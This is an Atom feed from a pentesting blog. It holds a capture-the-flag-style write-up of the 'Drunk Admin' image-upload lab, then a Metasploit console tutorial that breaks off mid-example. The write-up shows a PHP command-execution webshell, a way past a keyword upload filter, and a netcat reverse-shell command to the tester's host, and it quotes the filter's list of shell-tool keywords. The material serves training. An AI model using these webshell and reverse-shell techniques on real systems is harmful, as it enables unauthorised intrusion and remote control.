<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: pentesting | Core dump overflow]]></title>
  <link href="http://chousensha.github.io/blog/categories/pentesting/atom.xml" rel="self"/>
  <link href="http://chousensha.github.io/"/>
  <updated>2016-06-14T07:35:21-04:00</updated>
  <id>http://chousensha.github.io/</id>
  <author>
    <name><![CDATA[chousensha]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Pentest lab - Drunk Admin Web Hacking Challenge]]></title>
    <link href="http://chousensha.github.io/blog/2016/06/12/pentest-lab-drunk-admin-web-hacking-challenge/"/>
    <updated>2016-06-12T11:51:50-04:00</updated>
    <id>http://chousensha.github.io/blog/2016/06/12/pentest-lab-drunk-admin-web-hacking-challenge</id>
    <content type="html"><![CDATA[<h1>Mission statement</h1>

<p>The challenge includes an image hosting web service that has various design vulnerabilities. You must enumerate the various web service features and find an exploitable vulnerability in order to read system hidden files. The web application is 100% custom so do not try to search google for relative PoC exploit code.</p>

<p>FINAL GOAL: Reveal the hidden message for a date arrange that Bob sent to Alice.</p>

<!-- more -->


<h1>Recon</h1>

<p>Started with an Nmap scan, I only keep here the relevant output:</p>

<p><code>plain
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 5.5p1 Debian 6+squeeze1 (protocol 2.0)
8880/tcp open  http    syn-ack ttl 64 Apache httpd 2.2.16 ((Debian))
</code></p>

<p>As you can see, the box is pretty tightly locked. Oh well, we knew from the challenge title that it was going to be web-based. So let&rsquo;s see what&rsquo;s on the web server</p>

<p><img class="center" src="/images/pentest/drunkadmin/tripios.png" title="&lsquo;tripios&rsquo; &lsquo;tripios image hosting&rsquo;" ></p>

<p>And on the Info tab there is this very appealing request to report any vulnerabilities we may find with the site:
<code>Developer was really drunk while writting these code lines. Act like a pro and report any security flaws that you spotted around.</code></p>

<h1>Exploit</h1>

<p>First I uploaded a normal image which then gets displayed on the <em>image.php</em> page:</p>

<p><img class="center" src="/images/pentest/drunkadmin/upload.png" title="&lsquo;upload&rsquo; &lsquo;uploaded image&rsquo;" ></p>

<p>Next I uploaded a reverse PHP shell and changed the Content-Type header from application/x-php to image/png. This gave me an invalid file extension error. Then I tried again but this time I also changed the extension from PHP to PNG. Another error, saying &ldquo;you&rsquo;re naughty&rdquo;. This error kept flagging all my other attempts (tried uploading with double extensions or keeping just the PNG magic number and rest PHP code). So I went back to the start and once again found out that something I had dismissed as unimportant would play an important role in exploiting the target.</p>

<p>When uploading a correct image, I noticed a cookie was set: <code>trypios=246f7045b13ca34bd0fb443a038605de</code>. And when I looked at the image source, which I should have done in the first place, it looked like this: <code>images/246f7045b13ca34bd0fb443a038605de.png</code>.</p>

<p>Now I know where to access my uploaded files, but I still couldn&rsquo;t upload any PHP file. I remembered the mission briefing that stated this is a custom application and I thought there might be a filter that could catch the reverse shell, so I wrote a one line PHP script that simply echoes back a message. Thought it might be deemed harmless enough if there is a filter in place. And I finally managed to fool the application into uploading it by simply giving it a double extension of <code>.png.php</code> (something that I had tried before with the reverse shell and it got caught).</p>

<p>However, after successfully uploading it, my &ldquo;cool image&rdquo; wasn&rsquo;t displayed at all, and it didn&rsquo;t exist in the source either. I navigated directly to where it should be (based on the cookie value), which in my case was at <a href="http://192.168.80.160:8880/images/178eaa4e889ab53ce844344ffc945171">http://192.168.80.160:8880/images/178eaa4e889ab53ce844344ffc945171</a></p>

<p>And boom! The string &ldquo;RCE possible&rdquo; was displayed, which is exactly what I had my script outputting! The key takeaway here was that <strong>the file upload vulnerability was easily exploited by adding a double extension, but there was also a filter in place that flagged certain PHP code and prevented the upload</strong>. Because I could get code execution with a simple echo script, but not with the reverse shell.</p>

<p>With this information, I made another simple script to see if I can get command execution on the target:</p>

<p><code>php
&lt;?php
echo exec($_GET['cmd']);
?&gt;
</code></p>

<p>When I tried uploading it&hellip;again the naughty message! Clearly some filtering is in place. I modified it again to:</p>

<p><code>php
echo exec('whoami');
</code></p>

<p>It got uploaded without a problem and it displayed www-data when I went to it. So it appears that $<em>GET triggered the filter. I tried again, this time with $</em>REQUEST:</p>

<p><code>php
echo exec($_REQUEST['cmd']);
</code></p>

<p>And the filter didn&rsquo;t trigger! I went to it and passed the <em>pwd</em> command and success! It displayed /var/www/images. So command execution on the host finally achieved. I tweaked it a bit to give me a reverse shell, because it would be inconvenient to navigate the filesystem in its current state. So I had netcat listen on my 5555 port and then sent a shell from the remote host with <code>cmd=nc -c /bin/sh 192.168.80.158 5555</code></p>

<p>Now that I&rsquo;m the system, time to look around for the secret message:</p>

<p><code>plain
root@pwnbox:~#nc -vvnlp 5555
listening on [any] 5555 ...
connect to [192.168.80.158] from (UNKNOWN) [192.168.80.160] 49553
ls /home
bob
ls /home/bob/
Documents
public_html
</code></p>

<p>I looked in Bob&rsquo;s directory and found some PHP files but none contained any message. So I took a look at the <code>/var/www</code> as well:</p>

<p><code>plain
ls -a /var/www
.
..
.htaccess
.proof
image.php
images
index.php
info.php
myphp.php
style
upload.php
xmm.html
</code></p>

<p>A hidden proof file! Let&rsquo;s see what&rsquo;s in it:</p>

<p>``` plain
cat .proof</p>

<h6>#</h6>

<h1>Drunk Admin Challenge</h1>

<h1>by @anestisb</h1>

<h6>#</h6>

<p>bob> Great work.
bob> Meet me there.
&hellip;> ?
bob> What? You don&rsquo;t know where?
bob> Work a little more your post</p>

<pre><code> exploitation skills.
</code></pre>

<p>Secret Code:
TGglMUxecjJDSDclN1Ej</p>

<p>Mail me your methods at:
<a href="&#x6d;&#97;&#105;&#x6c;&#116;&#111;&#58;&#x61;&#x6e;&#101;&#x73;&#x74;&#105;&#x73;&#x40;&#x62;&#x65;&#99;&#x68;&#116;&#x73;&#x6f;&#117;&#x64;&#105;&#115;&#x2e;&#99;&#111;&#109;">&#x61;&#110;&#101;&#x73;&#x74;&#105;&#x73;&#x40;&#x62;&#101;&#99;&#x68;&#x74;&#115;&#111;&#x75;&#x64;&#x69;&#x73;&#46;&#x63;&#111;&#x6d;</a>
```</p>

<p>All right, found the right one! I tried to decode that string but didn&rsquo;t get any intelligible output. This time though, all those PHP files that I found in bob&rsquo;s home directory would come in handy! There is a <em>public_html</em> file in bob&rsquo;s home with files that encrypt and decrypt passwords.</p>

<p><code>plain
ls /home/bob/public_html
encrypt.php
include
index.php
</code></p>

<p>I copied the contents of the files to the <em>/var/www/images</em> directory and then I checked that index.php file:</p>

<p><img class="center" src="/images/pentest/drunkadmin/secret.png" title="&lsquo;secret&rsquo; &lsquo;secret decryption&rsquo;" ></p>

<p>But when I gave it the string <code>TGglMUxecjJDSDclN1Ej</code> I got garbage. Now, one of the things I tried before was to base64 decode the string. The output I got was <code>Lh%1L<sup>r2CH7</sup>%7Q#</code>, which didn&rsquo;t really help. Since I couldn&rsquo;t decrypt the secret with the form either, I thought to double check what kind of encoding it might use. And because I was thinking base64 but not sure, I inspired myself from a <a href="https://stackoverflow.com/questions/11656115/decode-python-base64-string">Stack Overflow post</a> to check if the string really is base64 in Python:</p>

<p>``` python</p>

<p>import base64
import binascii</p>

<p>testme = raw_input(&ldquo;Enter string to check if base64: &rdquo;)</p>

<p>try:</p>

<pre><code>base64.decodestring(testme)
print base64.decodestring(testme)
</code></pre>

<p>except binascii.Error:</p>

<pre><code>print "[x] Sorry, this isn't base64"
</code></pre>

<p>```</p>

<p>And the the script did return the same output that I had decoded earlier: <code>Lh%1L<sup>r2CH7</sup>%7Q#</code>. So this time, I tried to enter this string in the decrypt form..and the message was revealed!</p>

<p><code>Alice, prepare for a kinky night. Meet me at &lsquo;35.517286&rsquo; &lsquo;24.017637&rsquo;</code></p>

<p>Yes! The message was decrypted and challenge completed! I was curious though and looked at the coordinates in Google Maps. It seems that Bob and Alice&rsquo;s chosen place of fun is a location in Greece:</p>

<p><img class="center" src="/images/pentest/drunkadmin/location.png" title="&lsquo;meeting location&rsquo; &lsquo;secret location&rsquo;" ></p>

<p>Before wrapping up, do you remember the upload filter that caught the malicious uploads and gave a naughty message? I took a peek at it and here&rsquo;s the filter part:</p>

<p>``` php
if(isset($_POST[&lsquo;Submit&rsquo;]) &amp;&amp; !$errors) {</p>

<pre><code>$file = file_get_contents("./images/$image_name");
if( strpos($file,"perl") ||
strpos($file,"bash") ||
strpos($file,"sh -c") ||
strpos($file,"python") ||
strpos($file,"nc ") ||
strpos($file,"netcat") ||
strpos($file,"base64") ||
strpos($file,"ruby") ||
strpos($file,"fsockopen") ||
strpos($file,"xterm") ||
strpos($file,"gcc") ||
strpos($file,'$_GET') ||
strpos($file,'$_POST') ||
strpos($file,'$_SERVER') ||
strpos($file,'$_FILES') ||
strpos($file,'$_COOKIE') )
{ 
echo "&lt;h1&gt;Ohhh you are naughty!&lt;/h1&gt;"; 
exec("rm ./images/$image_name");
die;
}
</code></pre>

<p>```</p>

<p>Nice twist on this file upload vulnerability!</p>

<h1>Report</h1>

<p>This was another interesting challenge that seemed straightforward at the beginning but required more trial and error to solve. The steps that led to the exploitation were:</p>

<ul>
<li><p>server was vulnerable to unrestricted file upload that led to remote code execution</p></li>
<li><p>the filter that tried to protect against malicious code didn&rsquo;t stop everything that an attacker could use</p></li>
<li><p>the hidden file was not so hidden in the <em>/var/www</em> directory</p></li>
<li><p>files in Bob&rsquo;s home folder were readable, allowing the decryption of the secret message</p></li>
</ul>


<p>The key takeaway for me was to start simple and build from there when testing stuff. I would have saved so much time if I had tried a simple PHP code execution test, instead of throwing reverse shells and scratching my head when it didn&rsquo;t work</p>

<p>And today, instead of a cookie, I leave here the picture that gets displayed when you go to a non existent page on the server:</p>

<p><img class="center" src="/images/pentest/drunkadmin/think.png" title="&lsquo;think&rsquo; &lsquo;hmm&rsquo;" ></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest tools - Metasploit]]></title>
    <link href="http://chousensha.github.io/blog/2016/06/11/pentest-tools-metasploit/"/>
    <updated>2016-06-11T13:57:36-04:00</updated>
    <id>http://chousensha.github.io/blog/2016/06/11/pentest-tools-metasploit</id>
    <content type="html"><![CDATA[<p>In this post I am going to focus on the use of Metasploit.</p>

<p>Before starting, I want to leave here some links to good resources for learning Metasploit:</p>

<p><a href="https://www.offensive-security.com/metasploit-unleashed/">Offensive Security Metasploit Unleashed free training course</a></p>

<p><a href="http://www.securitytube.net/groups?operation=view&amp;groupId=8">SecurityTube Metasploit Megaprimer</a></p>

<p><a href="https://www.sans.org/security-resources/sec560/misc_tools_sheet_v1.pdf">SANS Metasploit Cheatsheet</a></p>

<p><a href="http://www.amazon.com/Metasploit-Penetration-Testers-David-Kennedy/dp/159327288X?ie=UTF8&amp;*Version*=1&amp;*entries*=0">Metasploit: The Penetration Tester&rsquo;s Guide</a></p>

<!-- more -->


<h1>Msfconsole</h1>

<p>The <code>msfconsole</code> (Metasploit Framework Console) is where you will be spending most of your time when working with Metasploit. You can do almost everything from here, but the amount of commands might seem overwhelming at first.</p>

<p><img class="center" src="/images/tools/metasploit/msfbanner.png" title="&lsquo;msfconsole&rsquo; &lsquo;metasploit framework&rsquo;" ></p>

<p>Besides the Metasploit functionality, you <strong>can run external commands in the console</strong>, which is really helpful.</p>

<p>``` plain
msf > uname -a
[*] exec: uname -a</p>

<p>Linux pwnbox 4.0.0-kali1-amd64 #1 SMP Debian 4.0.4-1+kali2 (2015-06-03) x86_64 GNU/Linux
```</p>

<p>The first thing you probably want to do is look at the help menu:</p>

<p>``` plain
msf > help</p>

<h1>Core Commands</h1>

<pre><code>Command       Description
-------       -----------
?             Help menu
advanced      Displays advanced options for one or more modules
back          Move back from the current context
banner        Display an awesome metasploit banner
cd            Change the current working directory
color         Toggle color
connect       Communicate with a host
edit          Edit the current module with $VISUAL or $EDITOR
exit          Exit the console
get           Gets the value of a context-specific variable
getg          Gets the value of a global variable
grep          Grep the output of another command
help          Help menu
info          Displays information about one or more modules
irb           Drop into irb scripting mode
jobs          Displays and manages jobs
kill          Kill a job
load          Load a framework plugin
loadpath      Searches for and loads modules from a path
makerc        Save commands entered since start to a file
options       Displays global options or for one or more modules
popm          Pops the latest module off the stack and makes it active
previous      Sets the previously loaded module as the current module
pushm         Pushes the active or list of modules onto the module stack
quit          Exit the console
reload_all    Reloads all modules from all defined module paths
rename_job    Rename a job
resource      Run the commands stored in a file
route         Route traffic through a session
save          Saves the active datastores
search        Searches module names and descriptions
sessions      Dump session listings and display information about sessions
set           Sets a context-specific variable to a value
setg          Sets a global variable to a value
show          Displays modules of a given type, or all modules
sleep         Do nothing for the specified number of seconds
spool         Write console output into a file as well the screen
threads       View and manipulate background threads
unload        Unload a framework plugin
unset         Unsets one or more context-specific variables
unsetg        Unsets one or more global variables
use           Selects a module by name
version       Show the framework and console library version numbers
</code></pre>

<p>&hellip;
```</p>

<p>Every time you enter a new context, you can use <strong>help</strong> to see the options available for that context. For instance, after selecting an exploit:</p>

<p>``` plain
msf > use exploit/linux/http/advantech_switch_bash_env_exec
msf exploit(advantech_switch_bash_env_exec) > help
&hellip;</p>

<h1>Exploit Commands</h1>

<pre><code>Command       Description
-------       -----------
check         Check to see if a target is vulnerable
exploit       Launch an exploit attempt
pry           Open a Pry session on the current module
rcheck        Reloads the module and checks if the target is vulnerable
reload        Just reloads the module
rerun         Alias for rexploit
rexploit      Reloads the module and launches an exploit attempt
run           Alias for exploit
</code></pre>

<p>```</p>

<p>Or after setting a payload:</p>

<p>``` plain</p>

<h1>Payload Commands</h1>

<pre><code>Command       Description
-------       -----------
check         Check to see if a target is vulnerable
generate      Generates a payload
pry           Open a Pry session on the current module
reload        Reload the current module from disk
</code></pre>

<p>```</p>

<p>Many commands also have their own help menu that you can access by typing <code>help cmd</code> or by passing the -h switch: <code>cmd -h</code>. Let&rsquo;s now glance over some core commands</p>

<h2>Core commands</h2>

<ul>
<li><strong>advanced</strong> &ndash; shows advanced options for a module</li>
</ul>


<p>``` plain
msf exploit(usermap_script) > advanced</p>

<p>Module advanced options (exploit/multi/samba/usermap_script):</p>

<p>   Name           : CHOST
   Current Setting:
   Description    : The local client address</p>

<p>   Name           : CPORT
   Current Setting:
   Description    : The local client port</p>

<p>   Name           : ConnectTimeout
   Current Setting: 10
   Description    : Maximum number of seconds to establish a TCP connection</p>

<p>   Name           : ContextInformationFile
   Current Setting:
   Description    : The information file that contains context information</p>

<p>   Name           : DisablePayloadHandler
   Current Setting: false
   Description    : Disable the handler code for the selected payload</p>

<p>   Name           : EnableContextEncoding
   Current Setting: false
   Description    : Use transient context when encoding payloads</p>

<p>   Name           : NTLM::SendLM
   Current Setting: true
   Description    : Always send the LANMAN response (except when NTLMv2_session is</p>

<pre><code>  specified)
</code></pre>

<p>   Name           : NTLM::SendNTLM
   Current Setting: true
   Description    : Activate the &lsquo;Negotiate NTLM key&rsquo; flag, indicating the use of</p>

<pre><code>  NTLM responses
</code></pre>

<p>   Name           : NTLM::SendSPN
   Current Setting: true
   Description    : Send an avp of type SPN in the ntlmv2 client blob, this allows</p>

<pre><code>  authentication on Windows 7+/Server 2008 R2+ when SPN is 
  required
</code></pre>

<p>   Name           : NTLM::UseLMKey
   Current Setting: false
   Description    : Activate the &lsquo;Negotiate Lan Manager Key&rsquo; flag, using the LM key</p>

<pre><code>  when the LM response is sent
</code></pre>

<p>   Name           : NTLM::UseNTLM2_session
   Current Setting: true
   Description    : Activate the &lsquo;Negotiate NTLM2 key&rsquo; flag, forcing the use of a</p>

<pre><code>  NTLMv2_session
</code></pre>

<p>   Name           : NTLM::UseNTLMv2
   Current Setting: true
   Description    : Use NTLMv2 instead of NTLM2_session when &lsquo;Negotiate NTLM2&rsquo; key</p>

<pre><code>  is true
</code></pre>

<p>   Name           : Proxies
   Current Setting:
   Description    : A proxy chain of format type:host:port[,type:host:port][&hellip;]</p>

<p>   Name           : SMB::ChunkSize
   Current Setting: 500
   Description    : The chunk size for SMB segments, bigger values will increase</p>

<pre><code>  speed but break NT 4.0 and SMB signing
</code></pre>

<p>   Name           : SMB::Native_LM
   Current Setting: Windows 2000 5.0
   Description    : The Native LM to send during authentication</p>

<p>   Name           : SMB::Native_OS
   Current Setting: Windows 2000 2195
   Description    : The Native OS to send during authentication</p>

<p>   Name           : SMB::VerifySignature
   Current Setting: false
   Description    : Enforces client-side verification of server response signatures</p>

<p>   Name           : SMBDirect
   Current Setting: true
   Description    : The target port is a raw SMB service (not NetBIOS)</p>

<p>   Name           : SMBDomain
   Current Setting: .
   Description    : The Windows domain to use for authentication</p>

<p>   Name           : SMBName
   Current Setting: *SMBSERVER
   Description    : The NetBIOS hostname (required for port 139 connections)</p>

<p>   Name           : SMBPass
   Current Setting:
   Description    : The password for the specified username</p>

<p>   Name           : SMBUser
   Current Setting:
   Description    : The username to authenticate as</p>

<p>   Name           : SSL
   Current Setting: false
   Description    : Negotiate SSL for outgoing connections</p>

<p>   Name           : SSLCipher
   Current Setting:
   Description    : String for SSL cipher &ndash; &ldquo;DHE-RSA-AES256-SHA&rdquo; or &ldquo;ADH&rdquo;</p>

<p>   Name           : SSLVerifyMode
   Current Setting: PEER
   Description    : SSL verification method (Accepted: CLIENT_ONCE,</p>

<pre><code>  FAIL_IF_NO_PEER_CERT, NONE, PEER)
</code></pre>

<p>   Name           : SSLVersion
   Current Setting: TLS1
   Description    : Specify the version of SSL/TLS to be used (TLS and SSL23 are</p>

<pre><code>  auto-negotiate) (Accepted: SSL2, SSL3, SSL23, TLS, TLS1, TLS1.1, 
  TLS1.2)
</code></pre>

<p>   Name           : VERBOSE
   Current Setting: false
   Description    : Enable detailed status messages</p>

<p>   Name           : WORKSPACE
   Current Setting:
   Description    : Specify the workspace for this module</p>

<p>   Name           : WfsDelay
   Current Setting: 0
   Description    : Additional delay when waiting for a session
```</p>

<ul>
<li><strong>back</strong> &ndash; allows you to go back from the current module</li>
</ul>


<p><code>plain
msf exploit(usermap_script) &gt; back
msf &gt;
</code></p>

<ul>
<li><strong>connect</strong> &ndash; connect to a host on the specified port, like you would do with netcat</li>
</ul>


<p>``` plain
msf > connect -h
Usage: connect [options] <host> <port></p>

<p>Communicate with a host, similar to interacting via netcat, taking advantage of
any configured session pivoting.</p>

<p>OPTIONS:</p>

<pre><code>-C        Try to use CRLF for EOL sequence.
-P &lt;opt&gt;  Specify source port.
-S &lt;opt&gt;  Specify source address.
-c &lt;opt&gt;  Specify which Comm to use.
-h        Help banner.
-i &lt;opt&gt;  Send the contents of a file.
-p &lt;opt&gt;  List of proxies to use.
-s        Connect with SSL.
-u        Switch to a UDP socket.
-w &lt;opt&gt;  Specify connect timeout.
-z        Just try to connect, then return.
</code></pre>

<p>msf > connect 192.168.80.156 25
[*] Connected to 192.168.80.156:25
220 metasploitable.localdomain ESMTP Postfix (Ubuntu)
VRFY root
252 2.0.0 root
```</p>

<ul>
<li><strong>info</strong> &ndash; lists detailed information about a module, including description, vulnerable targets, payload information and more</li>
</ul>


<p>``` plain
msf > info exploit/windows/smb/ms08_067_netapi</p>

<pre><code>   Name: MS08-067 Microsoft Server Service Relative Path Stack Corruption
 Module: exploit/windows/smb/ms08_067_netapi
</code></pre>

<p>   Platform: Windows
 Privileged: Yes</p>

<pre><code>License: Metasploit Framework License (BSD)
   Rank: Great
</code></pre>

<p>  Disclosed: 2008-10-28</p>

<p>Provided by:
  hdm <a href="&#109;&#97;&#x69;&#108;&#x74;&#111;&#x3a;&#x78;&#x40;&#x68;&#x64;&#109;&#46;&#105;&#x6f;">&#x78;&#x40;&#x68;&#x64;&#109;&#46;&#105;&#111;</a>
  Brett Moore <a href="&#x6d;&#x61;&#105;&#108;&#116;&#x6f;&#x3a;&#x62;&#x72;&#x65;&#x74;&#116;&#46;&#x6d;&#x6f;&#111;&#114;&#101;&#x40;&#105;&#110;&#x73;&#x6f;&#x6d;&#x6e;&#105;&#x61;&#x73;&#101;&#x63;&#46;&#99;&#111;&#109;">&#98;&#114;&#x65;&#x74;&#116;&#x2e;&#109;&#x6f;&#x6f;&#x72;&#101;&#64;&#x69;&#110;&#115;&#111;&#109;&#110;&#105;&#x61;&#x73;&#x65;&#x63;&#46;&#99;&#x6f;&#x6d;</a>
  frank2 <a href="&#109;&#x61;&#105;&#108;&#116;&#111;&#58;&#x66;&#114;&#x61;&#110;&#x6b;&#50;&#x40;&#x64;&#99;&#57;&#x34;&#57;&#46;&#x6f;&#114;&#103;">&#102;&#x72;&#x61;&#x6e;&#107;&#50;&#x40;&#x64;&#99;&#57;&#x34;&#x39;&#46;&#111;&#x72;&#103;</a>
  jduck <a href="&#109;&#97;&#105;&#108;&#116;&#x6f;&#x3a;&#106;&#x64;&#x75;&#99;&#x6b;&#64;&#109;&#101;&#x74;&#x61;&#x73;&#112;&#x6c;&#x6f;&#x69;&#x74;&#46;&#99;&#111;&#x6d;">&#106;&#100;&#117;&#99;&#x6b;&#64;&#109;&#x65;&#116;&#x61;&#115;&#112;&#108;&#x6f;&#105;&#116;&#46;&#99;&#111;&#x6d;</a></p>

<p>Available targets:
  Id  Name</p>

<hr />

<p>  0   Automatic Targeting
  1   Windows 2000 Universal
  2   Windows XP SP0/SP1 Universal
  3   Windows 2003 SP0 Universal
  4   Windows XP SP2 English (AlwaysOn NX)
  5   Windows XP SP2 English (NX)
  6   Windows XP SP3 English (AlwaysOn NX)
  7   Windows XP SP3 English (NX)
  8   Windows XP SP2 Arabic (NX)
  9   Windows XP SP2 Chinese &ndash; Traditional / Taiwan (NX)
  10  Windows XP SP2 Chinese &ndash; Simplified (NX)
  11  Windows XP SP2 Chinese &ndash; Traditional (NX)
  12  Windows XP SP2 Czech (NX)
  13  Windows XP SP2 Danish (NX)
  14  Windows XP SP2 German (NX)
  15  Windows XP SP2 Greek (NX)
  16  Windows XP SP2 Spanish (NX)
  17  Windows XP SP2 Finnish (NX)
  18  Windows XP SP2 French (NX)
  19  Windows XP SP2 Hebrew (NX)
  20  Windows XP SP2 Hungarian (NX)
  21  Windows XP SP2 Italian (NX)
  22  Windows XP SP2 Japanese (NX)
  23  Windows XP SP2 Korean (NX)
  24  Windows XP SP2 Dutch (NX)
  25  Windows XP SP2 Norwegian (NX)
  26  Windows XP SP2 Polish (NX)
  27  Windows XP SP2 Portuguese &ndash; Brazilian (NX)
  28  Windows XP SP2 Portuguese (NX)
  29  Windows XP SP2 Russian (NX)
  30  Windows XP SP2 Swedish (NX)
  31  Windows XP SP2 Turkish (NX)
  32  Windows XP SP3 Arabic (NX)
  33  Windows XP SP3 Chinese &ndash; Traditional / Taiwan (NX)
  34  Windows XP SP3 Chinese &ndash; Simplified (NX)
  35  Windows XP SP3 Chinese &ndash; Traditional (NX)
  36  Windows XP SP3 Czech (NX)
  37  Windows XP SP3 Danish (NX)
  38  Windows XP SP3 German (NX)
  39  Windows XP SP3 Greek (NX)
  40  Windows XP SP3 Spanish (NX)
  41  Windows XP SP3 Finnish (NX)
  42  Windows XP SP3 French (NX)
  43  Windows XP SP3 Hebrew (NX)
  44  Windows XP SP3 Hungarian (NX)
  45  Windows XP SP3 Italian (NX)
  46  Windows XP SP3 Japanese (NX)
  47  Windows XP SP3 Korean (NX)
  48  Windows XP SP3 Dutch (NX)
  49  Windows XP SP3 Norwegian (NX)
  50  Windows XP SP3 Polish (NX)
  51  Windows XP SP3 Portuguese &ndash; Brazilian (NX)
  52  Windows XP SP3 Portuguese (NX)
  53  Windows XP SP3 Russian (NX)
  54  Windows XP SP3 Swedish (NX)
  55  Windows XP SP3 Turkish (NX)
  56  Windows 2003 SP1 English (NO NX)
  57  Windows 2003 SP1 English (NX)
  58  Windows 2003 SP1 Japanese (NO NX)
  59  Windows 2003 SP1 Spanish (NO NX)
  60  Windows 2003 SP1 Spanish (NX)
  61  Windows 2003 SP1 French (NO NX)
  62  Windows 2003 SP1 French (NX)
  63  Windows 2003 SP2 English (NO NX)
  64  Windows 2003 SP2 English (NX)
  65  Windows 2003 SP2 German (NO NX)
  66  Windows 2003 SP2 German (NX)
  67  Windows 2003 SP2 Portuguese &ndash; Brazilian (NX)
  68  Windows 2003 SP2 Spanish (NO NX)
  69  Windows 2003 SP2 Spanish (NX)
  70  Windows 2003 SP2 Japanese (NO NX)
  71  Windows 2003 SP2 French (NO NX)
  72  Windows 2003 SP2 French (NX)</p>

<p>Basic options:
  Name     Current Setting  Required  Description</p>

<hr />

<p>  RHOST                     yes       The target address
  RPORT    445              yes       Set the SMB service port
  SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)</p>

<p>Payload information:
  Space: 410
  Avoid: 8 characters</p>

<p>Description:
  This module exploits a parsing flaw in the path canonicalization
  code of NetAPI32.dll through the Server Service. This module is
  capable of bypassing NX on some operating systems and service packs.
  The correct target must be used to prevent the Server Service (along
  with a dozen others in the same process) from crashing. Windows XP
  targets seem to handle multiple successful exploitation events, but
  2003 targets will often crash or hang on subsequent attempts. This
  is just the first version of this module, full support for NX bypass
  on 2003, along with other platforms, is still in development.</p>

<p>References:
  <a href="http://cvedetails.com/cve/2008-4250/">http://cvedetails.com/cve/2008-4250/</a>
  <a href="http://www.osvdb.org/49243">http://www.osvdb.org/49243</a>
  <a href="http://technet.microsoft.com/en-us/security/bulletin/MS08-067">http://technet.microsoft.com/en-us/security/bulletin/MS08-067</a>
  <a href="http://www.rapid7.com/vulndb/lookup/dcerpc-ms-netapi-netpathcanonicalize-dos">http://www.rapid7.com/vulndb/lookup/dcerpc-ms-netapi-netpathcanonicalize-dos</a>
```</p>

<ul>
<li><strong>jobs</strong> &ndash; check and interact with backgrounds jobs</li>
</ul>


<p>``` plain
msf > jobs -h
Usage: jobs [options]</p>

<p>Active job manipulation and interaction.</p>

<p>OPTIONS:</p>

<pre><code>-K        Terminate all running jobs.
-h        Help banner.
-i &lt;opt&gt;  Lists detailed information about a running job.
-k &lt;opt&gt;  Terminate jobs by job ID and/or range.
-l        List all running jobs.
-v        Print more detailed info.  Use with -i and -l
</code></pre>

<p>```</p>

<ul>
<li><strong>makerc</strong> &ndash; save the commands executed since startup to the specified file.</li>
</ul>


<p>``` plain
msf exploit(usermap_script) > makerc demo.rc
[<em>] Saving last 3 commands to demo.rc &hellip;
msf exploit(usermap_script) > cat demo.rc
[</em>] exec: cat demo.rc</p>

<p>cat demo.rc
clear
sessions
```</p>

<ul>
<li><strong>options</strong> &ndash; displays the options of a module</li>
</ul>


<p>``` plain
msf > help options
Usage: options [mod1 mod2 &hellip;]</p>

<p>Queries the supplied module or modules for options. If no module is given,
show options for the currently active module.</p>

<p>msf > options</p>

<h1>Global Options:</h1>

<p>   Option            Current Setting    Description</p>

<hr />

<p>   ConsoleLogging    false              Log all console input and output
   LogLevel          0                  Verbosity of logs (default 0, max 3)
   MinimumRank       0                  The minimum rank of exploits that will run without explicit confirmation
   Prompt            msf                The prompt string
   PromptChar        >                  The prompt character
   PromptTimeFormat  %Y-%m-%d %H:%M:%S  Format for timestamp escapes in prompts
   SessionLogging    false              Log all input and output for sessions
   TimestampOutput   false              Prefix all console output with a timestamp
```</p>

<ul>
<li><strong>resource</strong> &ndash; runs the commands in a file</li>
</ul>


<p>``` plain
msf auxiliary(telnet_login) > help resource
Usage: resource path1 [path2 &hellip;]</p>

<p>Run the commands stored in the supplied files.  Resource files may also contain
ruby code between <ruby></ruby> tags.</p>

<p>See also: makerc
```</p>

<ul>
<li><strong>route</strong> &ndash; route traffic through a session</li>
</ul>


<p>``` plain
msf auxiliary(telnet_login) > route -h
Usage: route [add/remove/get/flush/print] subnet netmask [comm/sid]</p>

<p>Route traffic destined to a given subnet through a supplied session.
The default comm is Local.
```</p>

<ul>
<li><strong>save</strong> &ndash; saves the current configuration</li>
</ul>


<p>``` plain
msf > help save
Usage: save</p>

<p>Save the active datastore contents to disk for automatic use across restarts of the console</p>

<p>The configuration is stored in /root/.msf5/config
```</p>

<ul>
<li><strong>search</strong> &ndash; this is what you will use when searching for exploits</li>
</ul>


<p>``` plain
msf > help search
Usage: search [keywords]</p>

<p>Keywords:
  app       :  Modules that are client or server attacks
  author    :  Modules written by this author
  bid       :  Modules with a matching Bugtraq ID
  cve       :  Modules with a matching CVE ID
  edb       :  Modules with a matching Exploit-DB ID
  name      :  Modules with a matching descriptive name
  osvdb     :  Modules with a matching OSVDB ID
  platform  :  Modules affecting this platform
  ref       :  Modules with a matching ref
  type      :  Modules of a specific type (exploit, auxiliary, or post)</p>

<p>Examples:
  search cve:2009 type:exploit app:client</p>

<p>msf > search heartbleed</p>

<h1>Matching Modules</h1>

<p>   Name                                              Disclosure Date  Rank    Description</p>

<hr />

<p>   auxiliary/scanner/ssl/openssl_heartbleed          2014-04-07       normal  OpenSSL Heartbeat (Heartbleed) Information Leak
   auxiliary/server/openssl_heartbeat_client_memory  2014-04-07       normal  OpenSSL Heartbeat (Heartbleed) Client Memory Exposure
```</p>

<ul>
<li><strong>sessions</strong> &ndash; interact with sessions</li>
</ul>


<p>``` plain
msf > sessions -h
Usage: sessions [options]</p>

<p>Active session manipulation and interaction.</p>

<p>OPTIONS:</p>

<pre><code>-K        Terminate all sessions
-c &lt;opt&gt;  Run a command on the session given with -i, or all
-h        Help banner
-i &lt;opt&gt;  Interact with the supplied session ID
-k &lt;opt&gt;  Terminate sessions by session ID and/or range
-l        List all active sessions
-q        Quiet mode
-r        Reset the ring buffer for the session given with -i, or all
-s &lt;opt&gt;  Run a script on the session given with -i, or all
-t &lt;opt&gt;  Set a response timeout (default: 15)
-u &lt;opt&gt;  Upgrade a shell to a meterpreter session on many platforms
-v        List verbose fields
</code></pre>

<p>Many options allow specifying session ranges using commas and dashes.
For example:  sessions -s checkvm -i 1,3-5  or  sessions -k 1-2,5,6
```</p>

<p>In the following example I am upgrading the shell of a session to Meterpreter:</p>

<p>``` plain
